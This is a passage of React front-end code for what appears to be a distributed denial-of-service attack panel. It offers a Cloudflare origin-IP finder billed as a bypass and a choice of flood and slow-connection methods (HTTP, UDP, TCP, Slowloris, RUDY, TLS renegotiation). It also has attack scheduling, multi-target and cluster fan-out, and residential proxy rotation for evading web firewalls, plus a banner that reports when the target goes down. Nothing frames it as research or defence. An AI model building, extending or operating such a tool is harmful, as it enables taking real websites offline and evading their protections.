                    <span>Scanning crt.sh SSL history · DNS subdomains · IPv6 · MX · SPF records...</span>
                  </div>
                )}
                {!isFindingOrigin && originResult && (
                  <div className="lb-origin-body">
                    <div className="lb-origin-summary">
                      <span className="lb-origin-domain">{originResult.domain}</span>
                      <span className={`lb-origin-badge ${originResult.isCloudflare ? "lb-origin-badge--cf" : "lb-origin-badge--direct"}`}>
                        {originResult.isCloudflare ? "☁ CLOUDFLARE DETECTED" : "✓ DIRECT (No CDN)"}
                      </span>
                      {originResult.crtHostsFound > 0 && (
                        <span className="lb-origin-stat">{originResult.crtHostsFound} SSL cert entries scanned</span>
                      )}
                    </div>

                    {originResult.originIPs.length > 0 ? (
                      <div className="lb-origin-found">
                        <div className="lb-origin-found-title">🎯 ORIGIN IP(s) FOUND — BYPASS CLOUDFLARE</div>
                        {originResult.originIPs.map(ip => {
                          const asn = originResult.asnInfo?.[ip];
                          return (
                            <div key={ip} className="lb-origin-ip-row">
                              <span className="lb-origin-ip">{ip}</span>
                              {asn && (
                                <span style={{ fontSize: 10, color: "#9b59b6", marginLeft: 6 }}>
                                  AS{asn.asn} · {asn.name} · {asn.country}
                                </span>
                              )}
                              <button className="lb-origin-use-btn" onClick={() => {
                                setTarget(ip);
                                addLog(`🎯 Target set to origin IP: ${ip}${asn ? ` [AS${asn.asn} ${asn.name}]` : ""} — Cloudflare bypassed!`, "success");
                                if (soundRef.current) playTone("check");
                                setShowOriginFinder(false);
                              }}>USE AS TARGET</button>
                            </div>
                          );
                        })}
                      </div>
                    ) : (
                      <div className="lb-origin-notfound">
                        <span>⚠ No unproxied origin IP found automatically.</span>
                      </div>
                    )}

                    <div className="lb-origin-tip">{originResult.tip}</div>

                    {originResult.findings.filter(f => !f.isCF).length > 0 && (
                      <div className="lb-origin-findings">
                        <div className="lb-origin-findings-title">Non-Cloudflare IPs discovered:</div>
                        {originResult.findings.filter(f => !f.isCF).slice(0, 15).map((f, i) => (
                          <div key={i} className={`lb-origin-finding lb-origin-finding--${f.confidence}`}>
                            <span className={`lb-origin-conf lb-origin-conf--${f.confidence}`}>{f.confidence.toUpperCase()}</span>
                            <span className="lb-origin-f-ip">{f.ip}</span>
                            <span className="lb-origin-f-src">{f.source}</span>
                          </div>
                        ))}
                      </div>
                    )}
                  </div>
                )}
              </div>
            )}

            {/* Power level */}
            <div className="lb-power-row">
              <span className="lb-power-label">POWER LEVEL</span>
              <div className="lb-power-bar-track">
                <div className="lb-power-bar-fill" style={{ width: `${pw.pct}%`, background: pw.color }}/>
              </div>
              <span className="lb-power-value" style={{ color: pw.color }}>{pw.label}</span>
            </div>

            {/* Params */}
            <div className="lb-params">
              <div className="lb-field">
                <label>Attack Method</label>
                <select className="lb-select" value={method} onChange={e => setMethod(e.target.value)}>
                  {methods.length === 0
                    ? <>
                        <option value="http-flood">HTTP Flood</option>
                        <option value="http2-flood">HTTP/2 Flood</option>
                        <option value="slowloris">Slowloris</option>
                        <option value="udp-flood">UDP Flood</option>
                        <option value="tcp-flood">TCP Flood</option>
                      </>
                    : methods.map((m: { id: string; name: string }) => <option key={m.id} value={m.id}>{m.name}</option>)
                  }
                </select>
              </div>
              <div className="lb-field">
                <label>Packet Size (bytes)</label>
                <input className="lb-num" type="number" min={1} max={65535} value={packetSize} onChange={e => setPacketSize(+e.target.value)}/>
              </div>
              <div className="lb-field">
                <label>Duration (s)</label>
                <input className="lb-num" type="number" min={1} max={3600} value={duration} onChange={e => setDuration(+e.target.value)}/>
              </div>
              <div className="lb-field">
                <label>Threads</label>
                <input className="lb-num" type="number" min={1} max={5000} value={threads} onChange={e => setThreads(+e.target.value)}/>
              </div>
              <div className="lb-field">
                <label>Packet Delay (ms)</label>
                <input className="lb-num" type="number" min={0} max={10000} value={delay} onChange={e => setDelay(+e.target.value)}/>
              </div>
              <div className="lb-field lb-field--webhook">
                <label className="lb-webhook-toggle" onClick={() => setShowWebhook(v => !v)}>
                  {showWebhook ? "▲" : "▼"} Webhook <span className="lb-opt">optional</span>
                </label>
                {showWebhook && (
                  <input className="lb-num" type="url" placeholder="https://..." value={webhookUrl} onChange={e => setWebhookUrl(e.target.value)}/>
                )}
              </div>

              {/* ── Attack Scheduler ── */}
              <div className="lb-field lb-field--cluster">
                <label className="lb-webhook-toggle" onClick={() => { setShowSchedule(v => !v); if (!showSchedule) loadScheduled(); }}>
                  {showSchedule ? "▲" : "▼"} Schedule Attack <span className="lb-opt">optional</span>
                  {scheduledList.filter(s => s.status === "pending").length > 0 && (
                    <span className="lb-cluster-badge">{scheduledList.filter(s => s.status === "pending").length} PENDING</span>
                  )}
                </label>
                {showSchedule && (
                  <div className="lb-cluster-body">
                    <div className="lb-cluster-hint">Schedule this attack to fire automatically at a future time.</div>
                    <div className="lb-named-save-row">
                      <input
                        className="lb-num"
                        style={{ flex: 1 }}
                        type="datetime-local"
                        value={scheduleTime}
                        onChange={e => setScheduleTime(e.target.value)}
                        min={new Date(Date.now() + 60000).toISOString().slice(0, 16)}
                      />
                      <button
                        className="lb-cluster-add-btn"
                        onClick={handleSchedule}
                        disabled={scheduleLoading}
                        style={{ background: scheduleLoading ? "#555" : "#C0392B", minWidth: 72 }}
                      >
                        {scheduleLoading ? "..." : "SCHEDULE"}
                      </button>
                    </div>
                    {scheduledList.length > 0 && (
                      <div className="lb-cluster-list" style={{ marginTop: 6 }}>
                        {scheduledList.map(s => (
                          <div key={s.id} className="lb-cluster-node lb-named-node">
                            <span className="lb-cluster-node-dot" style={{ background: s.status === "pending" ? "#f39c12" : s.status === "fired" ? "#2ecc71" : "#e74c3c" }}/>
                            <span className="lb-named-label">{s.method.toUpperCase()}</span>
                            <span className="lb-named-url">{new Date(s.scheduledAt).toLocaleString()} · {s.target.slice(0, 30)}</span>
                            <span style={{ fontSize: 10, color: s.status === "pending" ? "#f39c12" : "#2ecc71", marginLeft: 4 }}>{s.status.toUpperCase()}</span>
                            {s.status === "pending" && <button className="lb-fav-rm" onClick={() => cancelScheduled(s.id)}>✕</button>}
                          </div>
                        ))}
                      </div>
                    )}
                  </div>
                )}
              </div>

              {/* ── Multi-Target Mode ── */}
              <div className="lb-field lb-field--cluster">
                <label className="lb-webhook-toggle" onClick={() => setShowMultiTarget(v => !v)}>
                  {showMultiTarget ? "▲" : "▼"} Multi-Target Mode
                  {extraTargets.filter(t => t.trim()).length > 0 && (
                    <span className="lb-cluster-badge">{extraTargets.filter(t=>t.trim()).length+1} TARGETS</span>
                  )}
                </label>
                {showMultiTarget && (
                  <div className="lb-cluster-body">
                    <div className="lb-cluster-hint">Attack up to 3 targets simultaneously. Extra targets get 50% of the thread count.</div>
                    {([0, 1] as const).map(idx => (
                      <input
                        key={idx}
                        className="lb-num lb-cluster-input"
                        type="text"
                        placeholder={`Extra target ${idx + 2} (URL or IP)`}
                        value={extraTargets[idx]}
                        onChange={e => setExtraTargets(prev => {
                          const next: [string, string] = [...prev] as [string, string];
                          next[idx] = e.target.value;
                          return next;
                        })}
                      />
                    ))}
                  </div>
                )}
              </div>

              {/* ── Named Targets ── */}
              <div className="lb-field lb-field--cluster">
                <label className="lb-webhook-toggle" onClick={() => setShowNamedTargets(v => !v)}>
                  {showNamedTargets ? "▲" : "▼"} Named Targets
                  {namedTargets.length > 0 && (
                    <span className="lb-cluster-badge">{namedTargets.length} SAVED</span>
                  )}
                </label>
                {showNamedTargets && (
                  <div className="lb-cluster-body">
                    {target.trim() && (
                      <div className="lb-named-save-row">
                        <input
                          className="lb-num"
                          style={{ flex: 1 }}
                          placeholder="Label for current target..."
                          value={newNameLabel}
                          onChange={e => setNewNameLabel(e.target.value)}
                          onKeyDown={e => e.key === "Enter" && saveNamedTarget()}
                        />
                        <button className="lb-cluster-add-btn" onClick={saveNamedTarget}>SAVE</button>
                      </div>
                    )}
                    {namedTargets.length > 0 && (
                      <div className="lb-cluster-list">
                        {namedTargets.map(nt => (
                          <div key={nt.url} className="lb-cluster-node lb-named-node">
                            <span className="lb-cluster-node-dot"/>
                            <span className="lb-named-label" onClick={() => setTarget(nt.url)}>{nt.label}</span>
                            <span className="lb-named-url">{nt.url}</span>
                            <button className="lb-fav-rm" onClick={() => removeNamedTarget(nt.url)}>✕</button>
                          </div>
                        ))}
                      </div>
                    )}
                  </div>
                )}
              </div>

              {/* ── Custom Presets ── */}
              <div className="lb-field lb-field--cluster">
                <label className="lb-webhook-toggle" onClick={() => setShowCustomPresets(v => !v)}>
                  {showCustomPresets ? "▲" : "▼"} Custom Presets
                  {userPresets.length > 0 && (
                    <span className="lb-cluster-badge">{userPresets.length} SAVED</span>
                  )}
                </label>
                {showCustomPresets && (
                  <div className="lb-cluster-body">
                    <div className="lb-cluster-hint">Save the current config as a named preset.</div>
                    <div className="lb-named-save-row">
                      <input
                        className="lb-num"
                        style={{ flex: 1 }}
                        placeholder="Preset name..."
                        value={newPresetLabel}
                        onChange={e => setNewPresetLabel(e.target.value)}
                        onKeyDown={e => e.key === "Enter" && saveUserPreset()}
                      />
                      <button className="lb-cluster-add-btn" onClick={saveUserPreset}>SAVE</button>
                    </div>
                    {userPresets.length > 0 && (
                      <div className="lb-cluster-list">
                        {userPresets.map(p => (
                          <div key={p.id} className="lb-cluster-node lb-named-node">
                            <span className="lb-cluster-node-dot"/>
                            <span className="lb-named-label" style={{ cursor: "pointer" }} onClick={() => applyUserPreset(p)}>{p.label}</span>
                            <span className="lb-named-url">{p.method} · {p.threads}T · {p.duration}s</span>
                            <button className="lb-fav-rm" onClick={() => deleteUserPreset(p.id)}>✕</button>
                          </div>
                        ))}
                      </div>
                    )}
                  </div>
                )}
              </div>

              {/* ── Cluster Mode ── */}
              <div className="lb-field lb-field--cluster">
                <label className="lb-webhook-toggle" onClick={() => setShowCluster(v => !v)}>
                  {showCluster ? "▲" : "▼"} Cluster Nodes
                  {clusterNodes.length > 0 && (
                    <span className="lb-cluster-badge">{clusterNodes.length} NODE{clusterNodes.length > 1 ? "S" : ""} — {totalNodes}× POWER</span>
                  )}
                </label>
                {showCluster && (
                  <div className="lb-cluster-body">
                    <div className="lb-cluster-hint">
                      Add deployed API node URLs. Geass Override auto-fans out to all nodes via <code>CLUSTER_NODES</code> env var.
                      {clusterNodes.length > 0 && nodeHealth.length > 0 && (
                        <span className="lb-cluster-health-summary">
                          {" "}— {nodeHealth.filter(n => n.online).length + 1}/{clusterNodes.length + 1} online
                        </span>
                      )}
                    </div>
                    {/* Smart LB toggle */}
                    <label className="lb-smart-lb-toggle">
                      <input type="checkbox" checked={smartLB} onChange={e => {
                        setSmartLB(e.target.checked);
                        localStorage.setItem("lb-smart-lb", e.target.checked ? "1" : "0");
                      }}/>
                      <span className="lb-smart-lb-label">
                        Smart Load Balance — auto-assign different vectors per node
                        {smartLB && clusterNodes.length > 0 && (
                          <span className="lb-smart-lb-preview">
                            {" "}[{["local:" + method, ...clusterNodes.map((_, i) => `n${i+1}:${getSmartMethod(method, i+1)}`)].join(" · ")}]
                          </span>
                        )}
                      </span>
                    </label>
                    <div className="lb-cluster-add-row">
                      <input
                        className="lb-num lb-cluster-input"
                        type="url"
                        placeholder="https://my-api-server.replit.app"
                        value={clusterInput}
                        onChange={e => setClusterInput(e.target.value)}
                        onKeyDown={e => e.key === "Enter" && addClusterNode()}
                      />
                      <button className="lb-cluster-add-btn" onClick={addClusterNode}>ADD</button>
                    </div>
                    {clusterNodes.length > 0 && (
                      <div className="lb-cluster-list">
                        {/* Primary node (self) — always show first */}
                        <div className="lb-cluster-node lb-cluster-node--self">
                          <span className="lb-cluster-node-dot" style={{ background: "#2ecc71", boxShadow: "0 0 6px #2ecc71" }}/>
                          <span className="lb-cluster-node-url">📍 This node (primary)</span>
                          <span className="lb-cluster-node-status lb-cluster-node-status--online">ONLINE</span>
                        </div>
                        {clusterNodes.map((node, nodeIdx) => {
                          const health   = nodeHealth.find(h => h.url === node);
                          const online   = health?.online ?? null;
                          const latency  = health?.latencyMs ?? -1;
                          const dotColor = online === null ? "#888" : online ? latency < 100 ? "#2ecc71" : "#e67e22" : "#C0392B";
                          const isFiring = isRunning && clusterAttackIds.some(a => a.node === node);
                          return (
                            <div key={node} className={`lb-cluster-node ${isFiring ? "lb-cluster-node--active" : ""}`}>
                              <span className="lb-cluster-node-dot" style={{ background: dotColor, boxShadow: `0 0 5px ${dotColor}` }}/>
                              <span className="lb-cluster-node-url">{node}</span>
                              {health && (
                                <span className={`lb-cluster-node-status ${online ? "lb-cluster-node-status--online" : "lb-cluster-node-status--offline"}`}>
                                  {online ? `${latency}ms` : "OFFLINE"}
                                  {health.cpus ? ` · ${health.cpus}cpu` : ""}
                                </span>
                              )}
                              {isFiring && (
                                <span className="lb-cluster-node-firing">
                                  FIRING {smartLB ? `[${getSmartMethod(method, nodeIdx + 1).toUpperCase()}]` : ""}
                                </span>
                              )}
                              <button className="lb-fav-rm" onClick={() => removeClusterNode(node)}>✕</button>
                            </div>
                          );
                        })}
                      </div>
                    )}
                  </div>
                )}
              </div>
              {/* ── Proxy Rotation ── */}
              <div className="lb-field lb-field--cluster">
                <label className="lb-webhook-toggle" onClick={() => setShowProxyPanel(v => !v)}>
                  {showProxyPanel ? "▲" : "▼"} Proxy Rotation
                  {(proxies.length > 0 || residentialInfo) && (
                    <span className={`lb-cluster-badge${proxyEnabled ? " lb-cluster-badge--active" : ""}`}>
                      {proxies.length + (residentialInfo?.count ?? 0)} LIVE{proxyEnabled ? " · ON" : ""}
                    </span>
                  )}
                  {residentialInfo && <span className="lb-cluster-badge" style={{ background: "rgba(155,89,182,0.2)", color: "#9b59b6", borderColor: "rgba(155,89,182,0.4)" }}>🏠 RESIDENTIAL</span>}
                  {proxyFetching && <span className="lb-cluster-badge lb-cluster-badge--fetching">SCANNING...</span>}
                </label>
                {showProxyPanel && (
                  <div className="lb-cluster-body">
                    <div className="lb-cluster-hint">
                      Fetches live HTTP + SOCKS5 proxies from 22 public sources, tests latency, and rotates IPs across all L7 methods. Also supports residential rotating proxies (user:pass@host:port).
                    </div>

                    {/* ── Residential proxy section ── */}
                    <div style={{ marginBottom: "8px" }}>
                      {residentialInfo ? (
                        <div className="lb-proxy-residential" style={{ flexDirection: "column", alignItems: "flex-start", gap: "6px", padding: "10px 12px" }}>
                          <div style={{ display: "flex", alignItems: "center", gap: "8px", width: "100%" }}>
                            <span className="lb-proxy-res-dot"/>
                            <span className="lb-proxy-res-label" style={{ flex: 1 }}>
                              🏠 <strong>{residentialInfo.count}</strong> RESIDENTIAL SLOTS — <code style={{ color: "#9b59b6", fontSize: "0.8em" }}>{residentialInfo.host}:{residentialInfo.port}</code>
                            </span>
                            <span className="lb-proxy-res-badge">ROTATING</span>
                            <button
                              onClick={() => { setShowResForm(v => !v); }}
                              style={{ background: "transparent", border: "1px solid rgba(155,89,182,0.4)", color: "#9b59b6", borderRadius: "4px", padding: "2px 8px", cursor: "pointer", fontSize: "0.75em" }}
                            >{showResForm ? "✕" : "⚙ Edit"}</button>
                          </div>
                          <div style={{ fontSize: "0.72em", color: "#888", paddingLeft: "18px" }}>
                            Each connection exits via a different residential IP — max WAF evasion
                          </div>
                        </div>
                      ) : (
                        <button
                          onClick={() => setShowResForm(v => !v)}
                          style={{ background: "rgba(155,89,182,0.1)", border: "1px solid rgba(155,89,182,0.3)", color: "#9b59b6", borderRadius: "6px", padding: "6px 14px", cursor: "pointer", fontSize: "0.8em", width: "100%" }}
                        >
                          🏠 {showResForm ? "✕ Cancel" : "+ Configure Residential Proxies"}
                        </button>
                      )}

                      {showResForm && (
                        <div style={{ marginTop: "8px", background: "rgba(155,89,182,0.07)", border: "1px solid rgba(155,89,182,0.25)", borderRadius: "6px", padding: "10px" }}>
                          <div style={{ fontSize: "0.75em", color: "#9b59b6", marginBottom: "8px", fontWeight: 700 }}>⚙ RESIDENTIAL PROXY CREDENTIALS</div>
                          <div style={{ display: "grid", gridTemplateColumns: "1fr 80px", gap: "6px", marginBottom: "6px" }}>
                            <input placeholder="host (e.g. proxy.proxying.io)" value={resFormHost} onChange={e => setResFormHost(e.target.value)}
                              style={{ background: "#1a1a2e", border: "1px solid rgba(155,89,182,0.4)", borderRadius: "4px", color: "#fff", padding: "5px 8px", fontSize: "0.8em" }}/>
                            <input placeholder="port" value={resFormPort} onChange={e => setResFormPort(e.target.value)}
                              style={{ background: "#1a1a2e", border: "1px solid rgba(155,89,182,0.4)", borderRadius: "4px", color: "#fff", padding: "5px 8px", fontSize: "0.8em" }}/>
                          </div>
                          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "6px", marginBottom: "6px" }}>
                            <input placeholder="username" value={resFormUser} onChange={e => setResFormUser(e.target.value)}
                              style={{ background: "#1a1a2e", border: "1px solid rgba(155,89,182,0.4)", borderRadius: "4px", color: "#fff", padding: "5px 8px", fontSize: "0.8em" }}/>
                            <input placeholder="password" type="password" value={resFormPass} onChange={e => setResFormPass(e.target.value)}
                              style={{ background: "#1a1a2e", border: "1px solid rgba(155,89,182,0.4)", borderRadius: "4px", color: "#fff", padding: "5px 8px", fontSize: "0.8em" }}/>
                          </div>
                          <div style={{ display: "flex", gap: "6px", alignItems: "center" }}>
                            <input placeholder="slots (25)" value={resFormCount} onChange={e => setResFormCount(e.target.value)}
                              style={{ background: "#1a1a2e", border: "1px solid rgba(155,89,182,0.4)", borderRadius: "4px", color: "#fff", padding: "5px 8px", fontSize: "0.8em", width: "80px" }}/>
                            <button
                              disabled={resSaving || !resFormHost || !resFormUser || !resFormPass}
                              onClick={async () => {
                                setResSaving(true);
                                try {
                                  const r = await fetch(`${BASE}/api/proxies/residential`, {
                                    method: "POST",
                                    headers: { "Content-Type": "application/json" },
                                    body: JSON.stringify({ host: resFormHost, port: parseInt(resFormPort)||8080, username: resFormUser, password: resFormPass, count: parseInt(resFormCount)||25 }),
                                  });
                                  const d = await r.json() as { status?: string; residential?: ResidentialInfo; totalProxies?: number };
                                  if (d.residential) setResidentialInfo({ ...d.residential, username: resFormUser });
                                  setResidentialCount(parseInt(resFormCount)||25);
                                  setShowResForm(false);
                                  addLog(`🏠 Residential proxies configured — ${resFormCount} slots via ${resFormHost}:${resFormPort}`, "success");
                                } catch { addLog("✕ Failed to configure residential proxies", "error"); }
                                setResSaving(false);
                              }}
                              style={{ background: "#9b59b6", border: "none", color: "#fff", borderRadius: "4px", padding: "5px 14px", cursor: "pointer", fontSize: "0.8em", opacity: resSaving ? 0.6 : 1 }}
                            >{resSaving ? "Saving..." : "💾 Save"}</button>
                            {residentialInfo && (
                              <button
                                onClick={async () => {
                                  await fetch(`${BASE}/api/proxies/pinned`, { method: "DELETE" });
                                  setResidentialInfo(null); setResidentialCount(0); setShowResForm(false);
                                  addLog("🏠 Residential proxies removed", "warn");
                                }}
                                style={{ background: "transparent", border: "1px solid rgba(192,57,43,0.5)", color: "#C0392B", borderRadius: "4px", padding: "5px 10px", cursor: "pointer", fontSize: "0.8em" }}
                              >✕ Remove</button>
                            )}
                          </div>
                        </div>
                      )}
                    </div>

                    <div className="lb-proxy-controls">
                      <button
                        className={`lb-cluster-add-btn lb-proxy-fetch-btn${proxyFetching ? " lb-proxy-fetching" : ""}`}
                        onClick={handleFetchProxies}
                        disabled={proxyFetching}
                      >
                        {proxyFetching ? "⏳ SCANNING..." : "🌐 FETCH PUBLIC PROXIES"}
                      </button>
                      {(proxies.length > 0 || residentialInfo) && (
                        <label className="lb-smart-lb-toggle">
                          <input type="checkbox" checked={proxyEnabled} onChange={e => setProxyEnabled(e.target.checked)}/>
                          <span className="lb-smart-lb-label">
                            Enable proxy rotation
                            {proxyUsable && <span style={{ color: "#2ecc71" }}> [ACTIVE for {method}]</span>}
                            {proxyEnabled && !proxyUsable && method && (
                              <span style={{ color: "#e67e22" }}> [not applicable for {method}]</span>
                            )}
                          </span>
                        </label>
                      )}
                    </div>

                    {proxies.length > 0 && (() => {
                      const httpCount   = proxies.filter(p => p.type === "http" || !p.type).length;
                      const socks5Count = proxies.filter(p => p.type === "socks5").length;
                      const avgMs       = Math.round(proxies.slice(0,20).reduce((a,p)=>a+p.responseMs,0)/Math.min(20,proxies.length));
                      return (
                        <div className="lb-proxy-list">
                          <div className="lb-proxy-header2">
                            <span className="lb-proxy-hstat">{proxies.length} <span style={{ color:"#888" }}>public</span></span>
                            <span className="lb-proxy-hstat" style={{ color: "#3498db" }}>HTTP <strong>{httpCount}</strong></span>
                            <span className="lb-proxy-hstat" style={{ color: "#9b59b6" }}>SOCKS5 <strong>{socks5Count}</strong></span>
                            <span className="lb-proxy-hstat">avg <strong>{avgMs}ms</strong></span>
                            <span className="lb-proxy-hstat">best <strong style={{ color:"#2ecc71" }}>{proxies[0]?.responseMs}ms</strong></span>
                          </div>
                          {proxies.slice(0, 6).map((p, i) => {
                            const pType = p.type ?? "http";
                            const latColor = p.responseMs < 200 ? "#2ecc71" : p.responseMs < 800 ? "#e67e22" : "#C0392B";
                            return (
                              <div key={i} className="lb-cluster-node lb-proxy-row">
                                <span className="lb-cluster-node-dot" style={{ background: latColor, boxShadow: `0 0 4px ${latColor}` }}/>
                                <span className="lb-cluster-node-url lb-proxy-host">{p.host}:{p.port}</span>
                                <span className="lb-proxy-type-badge" style={{ color: pType === "socks5" ? "#9b59b6" : "#3498db", borderColor: pType === "socks5" ? "rgba(155,89,182,0.4)" : "rgba(52,152,219,0.4)" }}>{pType.toUpperCase()}</span>
                                <span className="lb-proxy-latency" style={{ color: latColor }}>{p.responseMs}ms</span>
                              </div>
                            );
                          })}
                          {proxies.length > 6 && (
                            <div className="lb-proxy-more">+{proxies.length - 6} more in rotation pool</div>
                          )}
                        </div>
                      );
                    })()}
                  </div>
                )}
              </div>
            </div>

            {/* Stats — 4 boxes + sparklines */}
            <div className="lb-stats">
              <div className="lb-stat lb-stat--red">
                <div className="lb-stat-head">
                  <span className="lb-stat-label">{isUDP ? "Pkt/sec" : "Req/sec"}</span>
                  <span className="lb-stat-live">LIVE</span>
                </div>
                <div className="lb-stat-val">{fmtNum(pps)}</div>
                <div className="lb-stat-sub">Peak {fmtNum(peakPps)}</div>
              </div>
              {/* Active connections — only for connection-based methods */}
              {(new Set(["slowloris","conn-flood","geass-override","rudy","ws-flood","rudy-v2","tls-renego","ssl-death","keepalive-exhaust","slow-read"])).has(method) ? (
                <div className="lb-stat lb-stat--conns">
                  <div className="lb-stat-head">
                    <span className="lb-stat-label">Open Conns</span>
                    <span className="lb-stat-live" style={{ color: activeConns > 0 ? "#e74c3c" : "#555" }}>
                      {activeConns > 0 ? "HOLD" : "RAMP"}
                    </span>
                  </div>
                  <div className="lb-stat-val" style={{ color: activeConns > 1000 ? "#e74c3c" : activeConns > 200 ? "#e67e22" : "#D4AF37" }}>
                    {activeConns > 0 ? fmtNum(activeConns) : "…"}
                  </div>
                  <div className="lb-stat-sub">
                    {method === "slowloris" ? `cap ${fmtNum(Math.min(Math.floor(Math.max(400, Math.round(threads * 0.08)) / 6) * 200, 100000) * 6)}` :
                     method === "conn-flood" ? `cap ${fmtNum(Math.min(Math.floor(Math.max(400, Math.round(threads * 0.08)) / 6) * 150, 80000) * 6)}` :
                     method === "ws-flood" ? `cap ${fmtNum(Math.min(threads * 200, 40000))}` :
                     method === "geass-override" ? "33-vector conn hold" :
                     "conn hold"}
                  </div>
                </div>
              ) : (
                <div className="lb-stat lb-stat--gold">
                  <div className="lb-stat-head">
                    <span className="lb-stat-label">Bandwidth</span>
                    <span className="lb-stat-live">OUT</span>
                  </div>
                  <div className="lb-stat-val">{fmtBps(bps)}</div>
                  <div className="lb-stat-sub">Peak {fmtBps(peakBps)}</div>
                </div>
              )}
              <div className="lb-stat lb-stat--dim">
                <div className="lb-stat-head">
                  <span className="lb-stat-label">Total {isUDP ? "Pkts" : "Reqs"}</span>
                  {clusterAttackIds.length > 0 && <span className="lb-stat-live">CLUSTER</span>}
                </div>
                <div className="lb-stat-val">{fmtNum(totalPackets)}</div>
                <div className="lb-stat-sub">{fmtBytes(totalBytes)}</div>
              </div>
              <div className="lb-stat lb-stat--dim">
                <div className="lb-stat-head">
                  <span className="lb-stat-label">All Time</span>
                  <span className="lb-stat-live">DB</span>
                </div>
                <div className="lb-stat-val">{fmtNum(stats?.totalPacketsSent ?? 0)}</div>
                <div className="lb-stat-sub">{fmtBytes(stats?.totalBytesSent ?? 0)}</div>
              </div>
              {(() => {
                const displayCount = Math.max(proxyLiveCount, residentialCount);
                const isLive = displayCount > 0;
                return (
                  <div className={`lb-stat lb-stat--proxy${isLive ? " lb-stat--proxy-live" : ""}`}
                       style={{ cursor: "pointer" }} onClick={() => { setShowProxyPanel(v => !v); }}>
                    <div className="lb-stat-head">
                      <span className="lb-stat-label">Proxies</span>
                      <span className="lb-stat-live" style={{ color: (proxyIsFetching || proxyFetching) ? "#e67e22" : isLive ? "#2ecc71" : "#666" }}>
                        {(proxyIsFetching || proxyFetching) ? "SCAN" : isLive ? "LIVE" : "NONE"}
                      </span>
                    </div>
                    <div className="lb-stat-val" style={{ color: (proxyIsFetching || proxyFetching) ? "#e67e22" : isLive ? "#2ecc71" : "#888", fontSize: displayCount > 99 ? "1.4rem" : undefined }}>
                      {(proxyIsFetching || proxyFetching) ? "…" : displayCount.toLocaleString()}
                    </div>
                    <div className="lb-stat-sub">
                      {proxyIsFetching
                        ? "scanning sources…"
                        : isLive
                          ? residentialCount > 0 ? `${residentialCount.toLocaleString()} residential` : "auto-refresh 10m"
                          : "click FETCH PROXIES"}
                    </div>
                  </div>
                );
              })()}

              {/* Live RPS chart with PPS + Bandwidth */}
              {isRunning && ppsHistory.length > 1 && (
                <div className="lb-sparkline-block">
                  <div className="lb-sparkline-label">
                    <span>LIVE TRAFFIC — {method.toUpperCase()}</span>
                    <span className={`lb-method-badge lb-method-badge--${mi.cls}`}>{mi.badge}</span>
                  </div>
                  <LiveRpsChart
                    ppsData={ppsHistory}
                    bpsData={bpsHistory}
                    color={sparklineColor}
                    peakPps={peakPps}
                  />
                </div>
              )}

              {/* Latency sparkline */}
              {isRunning && latencyHistory.length > 1 && (
                <div className="lb-sparkline-block lb-sparkline-block--latency">
                  <div className="lb-sparkline-label">
                    <span>PROBE LATENCY</span>
                    <span className="lb-lat-val" style={{
                      color: latencyHistory[latencyHistory.length-1] > 2000 ? "#C0392B"
                           : latencyHistory[latencyHistory.length-1] > 800  ? "#e67e22"
                           : "#2ecc71"
                    }}>
                      {latencyHistory[latencyHistory.length-1]}ms
                    </span>
                  </div>
                  <Sparkline data={latencyHistory} color="#9b59b6" />
                </div>
              )}
            </div>

            {/* Target status banner */}
            {isRunning && targetStatus !== "unknown" && (
              <div className={`lb-target-status ${targetStatus === "offline" ? "ts-offline" : "ts-online"}`}>
                <span className="ts-dot"/>
                <span className="ts-label">
                  {targetStatus === "online"
                    ? `TARGET ONLINE — ${target} responding`
                    : `💥 TARGET DOWN — ${target} not responding`
                  }
                </span>
                <span className="ts-monitor">
                  {latencyHistory.length > 0 ? `${latencyHistory[latencyHistory.length-1]}ms probe` : "Monitoring every 6s"}
                </span>
              </div>
            )}

            {/* Multi-target status */}
            {isRunning && extraAttackIds.filter(id => id !== null).length > 0 && (
              <div className="lb-multi-status">
                <span className="lb-multi-label">⚡ MULTI-TARGET ACTIVE</span>
                {extraTargets.filter(t => t.trim()).map((et, i) => (
                  <span key={i} className="lb-multi-target">
                    <span className="lb-cluster-node-dot"/> {et} [#{extraAttackIds[i] ?? "?"}]
                  </span>
                ))}
              </div>
            )}

            {/* Progress */}
            <div className="lb-progress-wrap">
              <div className="lb-progress-label">
                <span>Attack Progress</span>
                <span style={{ display: "flex", gap: "0.6rem", alignItems: "center" }}>
                  {isRunning && timeRemaining > 0 && (
                    <span className="lb-time-remaining">{timeRemaining}s remaining</span>
                  )}
                  <span>{Math.round(progress)}%</span>
                </span>
              </div>
              <div className="lb-progress-track">
                <div className="lb-progress-fill" style={{ width: `${progress}%` }}/>
              </div>
            </div>

            {/* Terminal */}
            <div className="lb-terminal" ref={terminalRef}>
              {logs.map(l => (
                <div key={l.id} className={`lb-line lb-line--${l.type}`}>
                  <span className="lb-prompt">›</span> {highlightLog(l.text)}
                </div>
              ))}
            </div>

            {/* Site checker */}
            <section className="lb-checker">
              <h3 className="lb-section-title">👁 Site Status Checker</h3>
              <div className="lb-checker-row">
                <input
                  className="lb-input lb-checker-input"
                  type="text"
                  placeholder="URL to probe (blank = uses target above)"
                  value={checkerUrl}
                  onChange={e => setCheckerUrl(e.target.value)}
                  onKeyDown={e => e.key === "Enter" && handleCheckSite()}
                />
                <button className="lb-checker-btn" onClick={handleCheckSite} disabled={isChecking}>
                  {isChecking ? "Probing..." : "Probe"}
                </button>
              </div>
              {checkerResult && (
                <div className={`lb-checker-result ${checkerResult.up ? "cr-up" : "cr-down"}`}>
                  <span className="cr-dot" style={{ background: statusColor(checkerResult.status) }}/>
                  <span className="cr-code" style={{ color: statusColor(checkerResult.status) }}>
                    {checkerResult.status === 0 ? "OFFLINE" : `HTTP ${checkerResult.status}`}
                  </span>
                  <span className="cr-text">{checkerResult.statusText}</span>
                  <span className="cr-time">{checkerResult.responseTime}ms</span>
                  <span className={`cr-pill ${checkerResult.up ? "cr-pill-up" : "cr-pill-down"}`}>
                    {checkerResult.up ? "ONLINE" : "DOWN"}
                  </span>
                </div>
              )}
            </section>

            {/* Attack history */}
            <section className="lb-history">
              <button className="lb-history-toggle"
                onClick={() => { setShowHistory(v => !v); if (!showHistory) refetchHistory(); }}>
                👁 Attack History ({allAttacks.length}) {showHistory ? "▲" : "▼"}
              </button>
              {showHistory && (
                <div className="lb-history-list">
                  {allAttacks.length === 0
                    ? <div className="lb-history-empty">No attacks on record.</div>
